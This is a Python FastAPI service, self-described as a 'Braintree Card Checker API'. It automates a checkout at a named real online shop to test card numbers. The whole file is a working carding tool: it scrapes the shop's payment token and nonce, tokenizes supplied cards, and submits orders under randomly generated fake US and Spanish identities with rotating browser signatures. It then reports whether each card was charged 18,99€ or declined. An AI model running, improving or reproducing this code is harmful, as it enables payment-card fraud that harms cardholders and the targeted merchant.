from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
import requests
import re
from bs4 import BeautifulSoup
import base64
import json
import uuid
import datetime
import os
import random
from typing import Optional

app = FastAPI(title="Braintree Card Checker API", version="1.0.0")

class CardRequest(BaseModel):
    card: str

class CardResponse(BaseModel):
    status: str
    message: str
    card_info: dict = None
    tds_status: Optional[str] = None
    enrolled: Optional[str] = None

def splitter(text: str, start: str, end: str) -> str:
    try:
        start_index = text.index(start) + len(start)
        end_index = text.index(end, start_index)
        return text[start_index:end_index]
    except ValueError:
        return ""

def parse_card(card: str):
    parts = re.split(r"\D+", card.strip())[:4]
    if len(parts) < 4:
        return "Invalid length (4 parts needed)."
    try:
        num, month, year, cvv = map(str, parts)
        month_str = month.zfill(2)
        year_str = year
        if len(year_str) == 2:
            year_str = str(2000 + int(year))
        return (num, month_str, year_str, cvv)
    except ValueError:
        return "Invalid card format."

def card_type(card_num):
    num = "".join(filter(str.isdigit, str(card_num)))
    if num[0] == "4":
        return "VISA"
    elif num[0] == "5":
        return "MasterCard"
    elif num[:2] in ["34", "37"]:
        return "AMEX"
    elif num[:4] == "6011" or num[:2] == "65":
        return "DISCOVER"
    else:
        return "CARD TYPE"

def get_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
    ]
    return random.choice(user_agents)

def generate_fake_data():
    first_names = ["John", "Jane", "Michael", "Sarah", "David", "Lisa", "Robert", "Emily", "James", "Ashley"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
    states = ["NY", "CA", "IL", "TX", "AZ", "PA", "FL", "OH", "NC", "GA"]
    
    first_name = random.choice(first_names)
    last_name = random.choice(last_names)
    city = random.choice(cities)
    state = random.choice(states)
    
    street_num = random.randint(100, 9999)
    street_names = ["Main St", "Oak Ave", "Pine St", "Maple Dr", "Cedar Ln", "Elm St", "Park Ave", "First St", "Second St", "Third St"]
    street_address = f"{street_num} {random.choice(street_names)}"
    
    zip_code = f"{random.randint(10000, 99999)}"
    phone = f"{random.randint(200, 999)}-{random.randint(200, 999)}-{random.randint(1000, 9999)}"
    email = f"{first_name.lower()}.{last_name.lower()}@gmail.com"
    
    return {
        "first_name": first_name,
        "last_name": last_name,
        "street_address": street_address,
        "city": city,
        "state": state,
        "zip_code": zip_code,
        "phone": phone,
        "email": email
    }

def generate_fake_data_es():
    first_names = ["Carlos", "Maria", "Jose", "Ana", "Francisco", "Carmen", "Antonio", "Isabel", "Manuel", "Pilar"]
    last_names = ["Garcia", "Rodriguez", "Lopez", "Martinez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Cruz", "Flores"]
    cities = ["Barcelona", "Madrid", "Valencia", "Sevilla", "Zaragoza", "Malaga", "Murcia", "Palma", "Bilbao", "Alicante"]
    
    first_name = random.choice(first_names)
    last_name = random.choice(last_names)
    city = random.choice(cities)
    
    street_num = random.randint(1, 200)
    street_names = ["Calle Mayor", "Avenida Principal", "Plaza Central", "Calle Real", "Paseo Maritimo"]
    street_address = f"{random.choice(street_names)} {street_num}"
    
    zip_code = f"11{random.randint(100, 999)}"
    
    return {
        "first_name": first_name,
        "last_name": last_name,
        "street_address": street_address,
        "city": city,
        "zip_code": zip_code
    }

def get_ip_address():
    try:
        resp = requests.get("https://api.ipify.org?format=json", timeout=30)
        if resp.status_code == 200:
            return resp.json().get("ip", "")
        else:
            print(f"[ERROR] Failed to get IP address: {resp.status_code}")
            return "8.8.8.8"  # Fallback IP
    except Exception as e:
        print(f"[ERROR] Failed to get IP address: {e}")
        return "8.8.8.8"  # Fallback IP

def braintree_payment(card_data):
    card_num, card_mm, card_yy, card_cvv = card_data
    
    user_agent = get_user_agent()
    fake_data = generate_fake_data()
    fake_data_es = generate_fake_data_es()
    
    session_id = str(uuid.uuid4())
    reference_id = str(uuid.uuid4())
    start_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    ip_address = get_ip_address()

    session = requests.Session()
    session.headers.update({'User-Agent': user_agent})

    try:
        # REQ 1: POST to admin-ajax.php
        resp = session.post(
            "https://nammanmuay.eu/wp-admin/admin-ajax.php",
            headers={
                "accept": "*/*",
                "accept-encoding": "gzip, deflate",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "no-cache",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://nammanmuay.eu",
                "pragma": "no-cache",
                "referer": "https://nammanmuay.eu/namman-muay-cream-100g/",
                "x-requested-with": "XMLHttpRequest",
            },
            data={
                "quantity": "1",
                "add-to-cart": "623",
                "action": "ouwoo_ajax_add_to_cart",
                "variation_id": "0",
            },
            timeout=60
        )

        if resp.status_code != 200:
            return "error", f"Request 1 failed with status code: {resp.status_code}"

        # REQ 2: GET to checkout
        resp = session.get(
            "https://nammanmuay.eu/checkout/",
            headers={
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "accept-encoding": "gzip, deflate",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "no-cache",
                "pragma": "no-cache",
                "referer": "https://nammanmuay.eu/namman-muay-cream-100g/",
                "upgrade-insecure-requests": "1",
            },
            timeout=60
        )

        if resp.status_code != 200:
            return "error", f"Request 2 failed with status code: {resp.status_code}"

        soup = BeautifulSoup(resp.text, "html.parser")
        script_tag = soup.find("script", string=re.compile(r"wc_braintree_client_token"))
        
        if not script_tag:
            return "error", "Script with 'wc_braintree_client_token' not found"

        script_content = script_tag.get_text()
        match = re.search(r"wc_braintree_client_token\s*=\s*\"(.*?)\"", script_content, re.DOTALL)
        
        if not match:
            return "error", "Variable 'wc_braintree_client_token' not found"

        client_token = match.group(1).strip()
        try:
            decoded_token = json.loads(base64.b64decode(client_token).decode("utf-8"))
            authorization_fingerprint = decoded_token.get("authorizationFingerprint")
        except Exception as e:
            return "error", f"Failed to decode client token: {str(e)}"

        input_tag = soup.find("input", id="woocommerce-process-checkout-nonce")
        if input_tag:
            checkout_nonce = input_tag.get("value")
        else:
            return "error", "Checkout nonce not found"

        # REQ 3: POST to graphql to get cardinalAuthenticationJWT
        resp = session.post(
            "https://payments.braintree-api.com/graphql",
            headers={
                "accept": "*/*",
                "accept-encoding": "gzip, deflate",
                "accept-language": "en-US,en;q=0.9",
                "authorization": f"Bearer {authorization_fingerprint}",
                "braintree-version": "2018-05-10",
                "cache-control": "no-cache",
                "content-type": "application/json",
                "origin": "https://assets.braintreegateway.com",
                "pragma": "no-cache",
                "referer": "https://assets.braintreegateway.com/",
            },
            json={
                "clientSdkMetadata": {
                    "source": "client",
                    "integration": "custom",
                    "sessionId": session_id,
                },
                "query": "query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT         cardinalSongbirdUrl         cardinalSongbirdIdentityHash       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     fastlane {       enabled       tokensOnDemand {         enabled         tokenExchange {           enabled         }       }     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }",
            },
            timeout=60
        )

        if resp.status_code != 200:
            return "error", f"Request 3 failed with status code: {resp.status_code}"

        resp_json = resp.json()
        try:
            cardinal_jwt = (
                resp_json.get("data", {})
                .get("clientConfiguration", {})
                .get("creditCard", {})
                .get("threeDSecure", {})
                .get("cardinalAuthenticationJWT")
            )
        except Exception:
            cardinal_jwt = None

        # REQ 4: POST to graphql to get tokenized credit card
        resp = session.post(
            "https://payments.braintree-api.com/graphql",
            headers={
                "accept": "*/*",
                "accept-encoding": "gzip, deflate",
                "accept-language": "en-US,en;q=0.9",
                "authorization": f"Bearer {authorization_fingerprint}",
                "braintree-version": "2018-05-10",
                "cache-control": "no-cache",
                "content-type": "application/json",
                "origin": "https://assets.braintreegateway.com",
                "pragma": "no-cache",
                "referer": "https://assets.braintreegateway.com/",
            },
            json={
                "clientSdkMetadata": {
                    "source": "client",
                    "integration": "custom",
                    "sessionId": session_id,
                },
                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }",
                "variables": {
                    "input": {
                        "creditCard": {
                            "number": card_num,
                            "expirationMonth": card_mm.zfill(2),
                            "expirationYear": (
                                "20" + card_yy if len(card_yy) == 2 else card_yy
                            ),
                            "cvv": card_cvv,
                            "billingAddress": {
                                "postalCode": fake_data["zip_code"],
                                "streetAddress": fake_data["street_address"],
                            },
                        },
                        "options": {"validate": False},
                    }
                },
                "operationName": "TokenizeCreditCard",
            },
            timeout=60
        )

        if resp.status_code != 200:
            return "error", f"Request 4 failed with status code: {resp.status_code}"

        resp_json = resp.json()
        try:
            token = resp_json.get("data", {}).get("tokenizeCreditCard", {}).get("token")
        except Exception:
            token = None

        if not token:
            return "error", "Failed to get token"

        # REQ 5: POST to lookup
        resp = session.post(
            f"https://api.braintreegateway.com/merchants/vb72b9cm2v6gskzz/client_api/v1/payment_methods/{token}/three_d_secure/lookup",
            headers={
                "accept": "*/*",
                "accept-encoding": "gzip, deflate",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "no-cache",
                "content-type": "application/json",
                "origin": "https://nammanmuay.eu",
                "pragma": "no-cache",
                "referer": "https://nammanmuay.eu/",
            },
            json={
                "amount": "18.99",
                "browserColorDepth": 24,
                "browserJavaEnabled": False,
                "browserJavascriptEnabled": True,
                "browserLanguage": "en-US",
                "browserScreenHeight": 1080,
                "browserScreenWidth": 1920,
                "browserTimeZone": 240,
                "deviceChannel": "Browser",
                "additionalInfo": {
                    "shippingGivenName": fake_data["first_name"],
                    "shippingSurname": fake_data["last_name"],
                    "ipAddress": ip_address,
                    "billingLine1": fake_data["street_address"],
                    "billingLine2": fake_data["street_address"],
                    "billingCity": fake_data["city"],
                    "billingState": "",
                    "billingPostalCode": fake_data["zip_code"],
                    "billingCountryCode": "US",
                    "billingPhoneNumber": fake_data["phone"],
                    "billingGivenName": fake_data_es["first_name"],
                    "billingSurname": fake_data_es["last_name"],
                    "shippingLine1": fake_data_es["street_address"],
                    "shippingLine2": fake_data_es["street_address"],
                    "shippingCity": fake_data_es["city"],
                    "shippingState": "",
                    "shippingPostalCode": fake_data_es["zip_code"],
                    "shippingCountryCode": "ES",
                    "email": fake_data["email"],
                },
                "bin": card_num[:6],
                "dfReferenceId": f"0_{reference_id}",
                "clientMetadata": {
                    "requestedThreeDSecureVersion": "2",
                    "sdkVersion": "web/3.123.1",
                    "cardinalDeviceDataCollectionTimeElapsed": 1,
                    "issuerDeviceDataCollectionTimeElapsed": 569,
                    "issuerDeviceDataCollectionResult": True,
                },
                "authorizationFingerprint": authorization_fingerprint,
                "braintreeLibraryVersion": "braintree/web/3.123.1",
                "_meta": {
                    "merchantAppId": "nammanmuay.eu",
                    "platform": "web",
                    "sdkVersion": "3.123.1",
                    "source": "client",
                    "integration": "custom",
                    "integrationType": "custom",
                    "sessionId": session_id,
                },
            },
            timeout=60
        )

        if resp.status_code != 200:
            return "error", f"Request 5 failed with status code: {resp.status_code}"

        resp_json = resp.json()
        try:
            nonce = resp_json.get("paymentMethod", {}).get("nonce")
            status = (
                resp_json.get("paymentMethod", {})
                .get("threeDSecureInfo", {})
                .get("status")
            )
            enrolled = (
                resp_json.get("paymentMethod", {})
                .get("threeDSecureInfo", {})
                .get("enrolled")
            )
        except Exception:
            return "error", "Failed to parse 3D Secure info"

        # REQ 6: POST to get cart id
        resp = session.post(
            "https://nammanmuay.eu/?wc-ajax=bwfan_insert_abandoned_cart&wfacp_id=54599&wfacp_is_checkout_override=yes",
            headers={
                "accept": "*/*",
                "accept-encoding": "gzip, deflate",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "no-cache",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://nammanmuay.eu",
                "pragma": "no-cache",
                "referer": "https://nammanmuay.eu/checkout/",
                "x-requested-with": "XMLHttpRequest",
            },
            data={
                "email": fake_data["email"],
                "action": "bwfan_insert_abandoned_cart",
                "checkout_fields_data[shipping_same_as_billing]": "1",
                "checkout_fields_data[shipping_postcode]": fake_data_es["zip_code"],
                "checkout_fields_data[shipping_state]": "",
                "checkout_fields_data[shipping_city]": fake_data_es["city"],
                "checkout_fields_data[shipping_address_2]": fake_data_es["street_address"],
                "checkout_fields_data[shipping_address_1]": fake_data_es["street_address"],
                "checkout_fields_data[shipping_country]": "US",
                "checkout_fields_data[shipping_last_name]": fake_data_es["last_name"],
                "checkout_fields_data[shipping_first_name]": fake_data_es["first_name"],
                "checkout_fields_data[billing_postcode]": fake_data["zip_code"],
                "checkout_fields_data[billing_state]": "",
                "checkout_fields_data[billing_city]": fake_data["city"],
                "checkout_fields_data[billing_address_2]": fake_data["street_address"],
                "checkout_fields_data[billing_address_1]": fake_data["street_address"],
                "checkout_fields_data[billing_country]": "US",
                "checkout_fields_data[billing_phone]": fake_data["phone"],
                "checkout_fields_data[billing_last_name]": fake_data["last_name"],
                "checkout_fields_data[billing_first_name]": fake_data["first_name"],
                "checkout_fields_data[ws_opt_in]": "1",
                "last_edit_field": "billing_country",
                "current_step": "single_step",
                "current_page_id": "54599",
                "timezone": "America/New_York",
                "aerocheckout_page_id": "54599",
                "pushengage_token": "",
                "_wpnonce": "a8f2caf831",
            },
            timeout=60
        )

        if resp.status_code != 200:
            return "error", f"Request 6 failed with status code: {resp.status_code}"

        try:
            cart_id = resp.json().get("id")
        except Exception:
            cart_id = None

        # REQ 7: POST to checkout (final request)
        resp = session.post(
            "https://nammanmuay.eu/?wc-ajax=checkout&wfacp_id=54599&wfacp_is_checkout_override=yes",
            headers={
                "accept": "application/json, text/javascript, */*; q=0.01",
                "accept-encoding": "gzip, deflate",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "no-cache",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://nammanmuay.eu",
                "pragma": "no-cache",
                "referer": "https://nammanmuay.eu/checkout/",
                "x-requested-with": "XMLHttpRequest",
            },
            data={
                "_wfacp_post_id": "54599",
                "wfacp_cart_hash": "",
                "wfacp_has_active_multi_checkout": "",
                "wfacp_source": "https://nammanmuay.eu/checkouts/checkout/",
                "product_switcher_need_refresh": "1",
                "wfacp_cart_contains_subscription": "0",
                "wfacp_exchange_keys": '{"pre_built":{},"oxy":{"wfacp_form":"wfacp_oxy_checkout_form","order_summary":"wfacp_order_summary_widget"}}',
                "wfacp_input_hidden_data": "{}",
                "wfacp_input_phone_field": f'{{"billing":{{"code":"1","number":"{fake_data["phone"]}","hidden":"no"}},"shipping":{{"code":"","number":"","hidden":""}}}}',
                "wfacp_timezone": "America/New_York",
                "wc_order_attribution_source_type": "typein",
                "wc_order_attribution_referrer": "https://nammanmuay.eu/namman-muay-cream-100g/",
                "wc_order_attribution_utm_campaign": "(none)",
                "wc_order_attribution_utm_source": "(direct)",
                "wc_order_attribution_utm_medium": "(none)",
                "wc_order_attribution_utm_content": "(none)",
                "wc_order_attribution_utm_id": "(none)",
                "wc_order_attribution_utm_term": "(none)",
                "wc_order_attribution_utm_source_platform": "",
                "wc_order_attribution_utm_creative_format": "",
                "wc_order_attribution_utm_marketing_tactic": "",
                "wc_order_attribution_session_entry": "https://nammanmuay.eu/checkout/",
                "wc_order_attribution_session_start_time": start_time,
                "wc_order_attribution_session_pages": "2",
                "wc_order_attribution_session_count": "1",
                "wc_order_attribution_user_agent": user_agent,
                "wfacp_billing_address_present": "yes",
                "wfob_input_hidden_data": "{}",
                "wfob_input_bump_shown_ids": "54600",
                "wfob_input_bump_global_data": "",
                "billing_email": fake_data["email"],
                "bwfan_cart_id": cart_id or "",
                "billing_first_name": fake_data["first_name"],
                "billing_last_name": fake_data["last_name"],
                "billing_address_1": fake_data["street_address"],
                "billing_address_2": fake_data["street_address"],
                "billing_country": "US",
                "billing_city": fake_data["city"],
                "billing_postcode": fake_data["zip_code"],
                "billing_phone": fake_data["phone"],
                "shipping_same_as_billing": "1",
                "shipping_first_name": fake_data_es["first_name"],
                "shipping_last_name": fake_data_es["last_name"],
                "shipping_address_1": fake_data_es["street_address"],
                "shipping_address_2": fake_data_es["street_address"],
                "shipping_country": "ES",
                "shipping_city": fake_data_es["city"],
                "shipping_postcode": fake_data_es["zip_code"],
                "wfacp_coupon_field": "",
                "shipping_method[0]": "flat_rate:53",
                "payment_method": "braintree_cc",
                "braintree_cc_nonce_key": nonce or "",
                "braintree_cc_device_data": f'{{"correlation_id":"{session_id}"}}',
                "braintree_cc_3ds_nonce_key": "",
                "braintree_cc_config_data": f'{{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/vb72b9cm2v6gskzz/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{{"url":"https://client-analytics.braintreegateway.com/vb72b9cm2v6gskzz"}},"merchantId":"vb72b9cm2v6gskzz","venmo":"off","graphQL":{{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]}},"challenges":["cvv"],"creditCards":{{"supportedCardTypes":["Discover","Maestro","UK Maestro","MasterCard","Visa","American Express"]}},"threeDSecureEnabled":true,"threeDSecure":{{"cardinalAuthenticationJWT":"{cardinal_jwt or ""}","cardinalSongbirdUrl":"https://songbird.cardinalcommerce.com/edge/v1/songbird.js","cardinalSongbirdIdentityHash":null}},"paypalEnabled":true,"paypal":{{"displayName":"Namman Muay","clientId":"AbRpNknbcK9FznJo2iQkRxSKrgXTdwyu1DiNyS7Pr8brByT5uCOVLQG1EKVFlP2JVDEX49yLnyWQaD1l","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"peterpupovacgmailcom","payeeEmail":null,"currencyIsoCode":"EUR"}}}}',
                "terms": "on",
                "terms-field": "1",
                "bwfan_user_consent": "1",
                "woocommerce-process-checkout-nonce": checkout_nonce,
                "_wp_http_referer": "/?wc-ajax=update_order_review&wfacp_id=54599&wfacp_is_checkout_override=yes",
                "billing_state": "",
                "shipping_state": "",
                "ship_to_different_address": "1",
            },
            timeout=60
        )

        if resp.status_code != 200:
            return "error", f"Request 7 failed with status code: {resp.status_code}"

        try:
            resp_json = resp.json()
        except Exception:
            return "error", "Invalid JSON response from checkout"
        
        if resp_json.get("result") == "success":
            return "approved", "Charged 18,99€", status, enrolled

        message = resp_json.get("messages", "")
        soup = BeautifulSoup(message, "html.parser")
        text = soup.get_text()
        match = re.search(r"Reason:\s*(.*)", text)
        error_reason = match.group(1) if match else "Unknown error"

        return "declined", error_reason, status, enrolled

    except Exception as e:
        return "error", f"Processing failed: {str(e)}"

@app.get("/")
def root():
    return {
        "message": "Braintree Card Checker API", 
        "version": "1.0.0",
        "status": "running",
        "endpoints": {
            "check_card": "/check-card",
            "health": "/health",
            "docs": "/docs"
        }
    }

@app.get("/health")
def health():
    return {
        "status": "healthy",
        "timestamp": datetime.datetime.now().isoformat(),
        "service": "Braintree Card Checker API"
    }

@app.post("/check-card", response_model=CardResponse)
def check_card(request: CardRequest):
    try:
        card = parse_card(request.card)
        if not isinstance(card, tuple):
            raise HTTPException(status_code=400, detail=f"Card parsing error: {card}")

        result = braintree_payment(card)

        if len(result) == 4:
            status, message, tds_status, enrolled = result
            return CardResponse(
                status=status,
                message=message,
                card_info={
                    "card_number": card[0][:4] + "****" + card[0][-4:],
                    "card_type": card_type(card[0]),
                    "expiry": f"{card[1]}/{card[2]}"
                },
                tds_status=tds_status,
                enrolled=enrolled
            )
        elif len(result) == 2:
            status, message = result
            return CardResponse(
                status=status,
                message=message,
                card_info={
                    "card_number": card[0][:4] + "****" + card[0][-4:],
                    "card_type": card_type(card[0]),
                    "expiry": f"{card[1]}/{card[2]}"
                }
            )
        else:
            return CardResponse(
                status="Error",
                message=str(result)
            )

    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Internal server error: {str(e)}")

if __name__ == "__main__":
    import uvicorn
    port = int(os.getenv("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
